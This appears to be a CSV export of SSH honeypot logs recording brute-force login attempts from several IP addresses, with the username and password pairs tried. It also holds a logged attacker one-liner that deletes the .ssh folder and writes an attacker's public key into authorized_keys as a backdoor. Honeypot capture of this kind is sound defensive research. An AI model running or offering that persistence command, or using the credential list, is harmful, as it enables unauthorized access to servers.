eventid,src_ip,src_port,dst_ip,dst_port,session,protocol,version,hassh,hasshAlgorithms,message,sensor,timestamp
cowrie.client.kex,101.126.27.230,,,,97db8b566741,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-10-06T23:11:00.649934Z
cowrie.login.failed,101.126.27.230,,,,97db8b566741,,,,,login attempt [user1/Qwerty123] failed,localhost,2024-10-06T23:11:01.447894Z
cowrie.session.closed,101.126.27.230,,,,97db8b566741,,,,,Connection lost after 2 seconds,localhost,2024-10-06T23:11:02.639905Z
cowrie.session.connect,47.234.143.55,43944,172.233.154.19,2222,df41afa77823,ssh,,,,New connection: 47.234.143.55:43944 (172.233.154.19:2222) [session: df41afa77823],localhost,2024-10-06T23:11:13.064252Z
cowrie.client.version,47.234.143.55,,,,df41afa77823,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-10-06T23:11:13.096783Z
cowrie.client.kex,47.234.143.55,,,,df41afa77823,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-10-06T23:11:13.146070Z
cowrie.login.failed,47.234.143.55,,,,df41afa77823,,,,,login attempt [admin/adminpassword] failed,localhost,2024-10-06T23:11:13.468332Z
cowrie.session.closed,47.234.143.55,,,,df41afa77823,,,,,Connection lost after 1 seconds,localhost,2024-10-06T23:11:14.521086Z
cowrie.session.connect,175.6.27.133,50360,172.233.154.19,2222,549f90ab4b0b,ssh,,,,New connection: 175.6.27.133:50360 (172.233.154.19:2222) [session: 549f90ab4b0b],localhost,2024-10-06T23:11:19.850621Z
cowrie.client.version,175.6.27.133,,,,549f90ab4b0b,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-10-06T23:11:19.851309Z
cowrie.client.kex,175.6.27.133,,,,549f90ab4b0b,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-10-06T23:11:20.022269Z
cowrie.login.success,175.6.27.133,,,,549f90ab4b0b,,,,,login attempt [root/1qazxcvb] succeeded,localhost,2024-10-06T23:11:20.746833Z
cowrie.session.params,175.6.27.133,,,,549f90ab4b0b,,,,,[],localhost,2024-10-06T23:11:21.104547Z
cowrie.command.input,175.6.27.133,,,,549f90ab4b0b,,,,,CMD: cd ~; chattr -ia .ssh; lockr -ia .ssh,localhost,2024-10-06T23:11:21.104945Z
cowrie.command.failed,175.6.27.133,,,,549f90ab4b0b,,,,,Command not found: lockr -ia .ssh,localhost,2024-10-06T23:11:21.105762Z
cowrie.log.closed,175.6.27.133,,,,549f90ab4b0b,,,,,Closing TTY Log: var/lib/cowrie/tty/c32b4937ce8564ea904a3bd2cb64805500ddfd28952a90fd55cb3c85d0be7644 after 0 seconds,localhost,2024-10-06T23:11:21.487719Z
cowrie.session.params,175.6.27.133,,,,549f90ab4b0b,,,,,[],localhost,2024-10-06T23:11:21.677238Z
cowrie.command.input,175.6.27.133,,,,549f90ab4b0b,,,,,"CMD: cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",localhost,2024-10-06T23:11:21.677809Z
cowrie.session.file_download,175.6.27.133,,,,549f90ab4b0b,,,,,Saved redir contents with SHA-256 a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 to var/lib/cowrie/downloads/a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2,localhost,2024-10-06T23:11:21.850234Z
cowrie.log.closed,175.6.27.133,,,,549f90ab4b0b,,,,,Closing TTY Log: var/lib/cowrie/tty/cc1eb03e9b5926d8076e25826664a04400de854bf5cc660fa35eb86cbdf7dc0f after 0 seconds,localhost,2024-10-06T23:11:21.850660Z
cowrie.session.connect,175.6.27.133,50980,172.233.154.19,2222,5b5b365cd92c,ssh,,,,New connection: 175.6.27.133:50980 (172.233.154.19:2222) [session: 5b5b365cd92c],localhost,2024-10-06T23:11:21.999025Z
cowrie.client.version,175.6.27.133,,,,5b5b365cd92c,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-10-06T23:11:21.999614Z
cowrie.client.kex,175.6.27.133,,,,5b5b365cd92c,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-10-06T23:11:22.160976Z
cowrie.login.failed,175.6.27.133,,,,5b5b365cd92c,,,,,login attempt [345gs5662d34/345gs5662d34] failed,localhost,2024-10-06T23:11:22.847128Z
cowrie.session.closed,175.6.27.133,,,,5b5b365cd92c,,,,,Connection lost after 2 seconds,localhost,2024-10-06T23:11:24.010816Z
cowrie.session.connect,175.6.27.133,51656,172.233.154.19,2222,1452a83e5ba1,ssh,,,,New connection: 175.6.27.133:51656 (172.233.154.19:2222) [session: 1452a83e5ba1],localhost,2024-10-06T23:11:24.190488Z
cowrie.client.version,175.6.27.133,,,,1452a83e5ba1,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-10-06T23:11:24.190971Z
cowrie.client.kex,175.6.27.133,,,,1452a83e5ba1,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-10-06T23:11:24.361655Z
cowrie.login.success,175.6.27.133,,,,1452a83e5ba1,,,,,login attempt [root/3245gs5662d34] succeeded,localhost,2024-10-06T23:11:25.084676Z
cowrie.session.closed,175.6.27.133,,,,1452a83e5ba1,,,,,Connection lost after 1 seconds,localhost,2024-10-06T23:11:25.256508Z
cowrie.session.closed,175.6.27.133,,,,549f90ab4b0b,,,,,Connection lost after 5 seconds,localhost,2024-10-06T23:11:25.258131Z
cowrie.session.connect,101.126.27.230,42770,172.233.154.19,2222,9a48cf2c2259,ssh,,,,New connection: 101.126.27.230:42770 (172.233.154.19:2222) [session: 9a48cf2c2259],localhost,2024-10-06T23:11:39.589189Z
cowrie.client.version,101.126.27.230,,,,9a48cf2c2259,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-10-06T23:11:39.589998Z
cowrie.client.kex,101.126.27.230,,,,9a48cf2c2259,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-10-06T23:11:39.778554Z
cowrie.session.connect,181.55.188.218,34992,172.233.154.19,2222,5d0a2e4ccca8,ssh,,,,New connection: 181.55.188.218:34992 (172.233.154.19:2222) [session: 5d0a2e4ccca8],localhost,2024-10-06T23:11:40.161591Z
cowrie.client.version,181.55.188.218,,,,5d0a2e4ccca8,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-10-06T23:11:40.163257Z
cowrie.client.kex,181.55.188.218,,,,5d0a2e4ccca8,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-10-06T23:11:40.273830Z
cowrie.login.failed,101.126.27.230,,,,9a48cf2c2259,,,,,login attempt [user1/11111] failed,localhost,2024-10-06T23:11:40.572997Z
cowrie.login.failed,181.55.188.218,,,,5d0a2e4ccca8,,,,,login attempt [hbq/123] failed,localhost,2024-10-06T23:11:40.786142Z
cowrie.session.closed,101.126.27.230,,,,9a48cf2c2259,,,,,Connection lost after 2 seconds,localhost,2024-10-06T23:11:41.763617Z
cowrie.session.closed,181.55.188.218,,,,5d0a2e4ccca8,,,,,Connection lost after 1 seconds,localhost,2024-10-06T23:11:41.912250Z
cowrie.session.connect,200.69.236.207,49635,172.233.154.19,2222,d7baefa52fab,ssh,,,,New connection: 200.69.236.207:49635 (172.233.154.19:2222) [session: d7baefa52fab],localhost,2024-10-06T23:11:44.623484Z
cowrie.client.version,200.69.236.207,,,,d7baefa52fab,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-10-06T23:11:44.624436Z
cowrie.client.kex,200.69.236.207,,,,d7baefa52fab,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-10-06T23:11:44.781096Z
cowrie.login.failed,200.69.236.207,,,,d7baefa52fab,,,,,login attempt [postgres/postgrespassword] failed,localhost,2024-10-06T23:11:45.446995Z
cowrie.session.closed,200.69.236.207,,,,d7baefa52fab,,,,,Connection lost after 1 seconds,localhost,2024-10-06T23:11:46.605748Z
cowrie.session.connect,47.234.143.55,56044,172.233.154.19,2222,93e325cbd6d9,ssh,,,,New connection: 47.234.143.55:56044 (172.233.154.19:2222) [session: 93e325cbd6d9],localhost,2024-10-06T23:11:50.724235Z
cowrie.client.version,47.234.143.55,,,,93e325cbd6d9,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-10-06T23:11:50.729163Z
cowrie.client.kex,47.234.143.55,,,,93e325cbd6d9,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-10-06T23:11:50.820734Z
cowrie.login.failed,47.234.143.55,,,,93e325cbd6d9,,,,,login attempt [user1/letmein] failed,localhost,2024-10-06T23:11:51.127576Z
cowrie.session.closed,47.234.143.55,,,,93e325cbd6d9,,,,,Connection lost after 1 seconds,localhost,2024-10-06T23:11:52.180102Z
cowrie.session.connect,175.6.27.133,34492,172.233.154.19,2222,237d989de3d3,ssh,,,,New connection: 175.6.27.133:34492 (172.233.154.19:2222) [session: 237d989de3d3],localhost,2024-10-06T23:12:09.375073Z
cowrie.client.version,175.6.27.133,,,,237d989de3d3,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-10-06T23:12:09.375694Z
cowrie.client.kex,175.6.27.133,,,,237d989de3d3,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-10-06T23:12:09.556954Z
cowrie.login.failed,175.6.27.133,,,,237d989de3d3,,,,,login attempt [user/11111] failed,localhost,2024-10-06T23:12:10.321510Z
cowrie.session.closed,175.6.27.133,,,,237d989de3d3,,,,,Connection lost after 2 seconds,localhost,2024-10-06T23:12:11.505004Z
cowrie.session.connect,101.126.27.230,52066,172.233.154.19,2222,ae02d2b84e1b,ssh,,,,New connection: 101.126.27.230:52066 (172.233.154.19:2222) [session: ae02d2b84e1b],localhost,2024-10-06T23:12:16.146031Z
cowrie.client.version,101.126.27.230,,,,ae02d2b84e1b,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-10-06T23:12:16.146779Z
cowrie.client.kex,101.126.27.230,,,,ae02d2b84e1b,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-10-06T23:12:16.328720Z
cowrie.login.failed,101.126.27.230,,,,ae02d2b84e1b,,,,,login attempt [ubuntu/zaq12wsx] failed,localhost,2024-10-06T23:12:17.096694Z
cowrie.session.closed,101.126.27.230,,,,ae02d2b84e1b,,,,,Connection lost after 2 seconds,localhost,2024-10-06T23:12:18.280751Z
cowrie.session.connect,181.55.188.218,47296,172.233.154.19,2222,ecde10f793a5,ssh,,,,New connection: 181.55.188.218:47296 (172.233.154.19:2222) [session: ecde10f793a5],localhost,2024-10-06T23:12:26.968052Z
cowrie.client.version,181.55.188.218,,,,ecde10f793a5,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-10-06T23:12:26.969649Z
cowrie.client.kex,181.55.188.218,,,,ecde10f793a5,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-10-06T23:12:27.080018Z
cowrie.login.failed,181.55.188.218,,,,ecde10f793a5,,,,,login attempt [cy/password123] failed,localhost,2024-10-06T23:12:27.576469Z
cowrie.session.closed,181.55.188.218,,,,ecde10f793a5,,,,,Connection lost after 1 seconds,localhost,2024-10-06T23:12:28.709584Z
cowrie.session.connect,47.234.143.55,40346,172.233.154.19,2222,2f47dee325d6,ssh,,,,New connection: 47.234.143.55:40346 (172.233.154.19:2222) [session: 2f47dee325d6],localhost,2024-10-06T23:12:31.763791Z
cowrie.client.version,47.234.143.55,,,,2f47dee325d6,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-10-06T23:12:31.764360Z
cowrie.client.kex,47.234.143.55,,,,2f47dee325d6,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-10-06T23:12:31.821793Z
cowrie.login.success,47.234.143.55,,,,2f47dee325d6,,,,,login attempt [root/!nf0] succeeded,localhost,2024-10-06T23:12:32.058284Z
cowrie.session.params,47.234.143.55,,,,2f47dee325d6,,,,,[],localhost,2024-10-06T23:12:32.587488Z
cowrie.command.input,47.234.143.55,,,,2f47dee325d6,,,,,CMD: cd ~; chattr -ia .ssh; lockr -ia .ssh,localhost,2024-10-06T23:12:32.588072Z
cowrie.command.failed,47.234.143.55,,,,2f47dee325d6,,,,,Command not found: lockr -ia .ssh,localhost,2024-10-06T23:12:32.589144Z
cowrie.log.closed,47.234.143.55,,,,2f47dee325d6,,,,,Closing TTY Log: var/lib/cowrie/tty/c32b4937ce8564ea904a3bd2cb64805500ddfd28952a90fd55cb3c85d0be7644 after 0 seconds,localhost,2024-10-06T23:12:32.760071Z
cowrie.session.params,47.234.143.55,,,,2f47dee325d6,,,,,[],localhost,2024-10-06T23:12:32.862256Z
cowrie.command.input,47.234.143.55,,,,2f47dee325d6,,,,,"CMD: cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",localhost,2024-10-06T23:12:32.863027Z
cowrie.session.file_download,47.234.143.55,,,,2f47dee325d6,,,,,Saved redir contents with SHA-256 a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 to var/lib/cowrie/downloads/a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2,localhost,2024-10-06T23:12:32.925137Z
cowrie.log.closed,47.234.143.55,,,,2f47dee325d6,,,,,Closing TTY Log: var/lib/cowrie/tty/cc1eb03e9b5926d8076e25826664a04400de854bf5cc660fa35eb86cbdf7dc0f after 0 seconds,localhost,2024-10-06T23:12:32.925707Z
cowrie.session.connect,47.234.143.55,41286,172.233.154.19,2222,801f97f245b3,ssh,,,,New connection: 47.234.143.55:41286 (172.233.154.19:2222) [session: 801f97f245b3],localhost,2024-10-06T23:12:32.988825Z
cowrie.client.version,47.234.143.55,,,,801f97f245b3,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-10-06T23:12:32.989286Z
cowrie.client.kex,47.234.143.55,,,,801f97f245b3,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-10-06T23:12:33.043581Z
cowrie.session.connect,200.69.236.207,55788,172.233.154.19,2222,87477552febd,ssh,,,,New connection: 200.69.236.207:55788 (172.233.154.19:2222) [session: 87477552febd],localhost,2024-10-06T23:12:33.162207Z
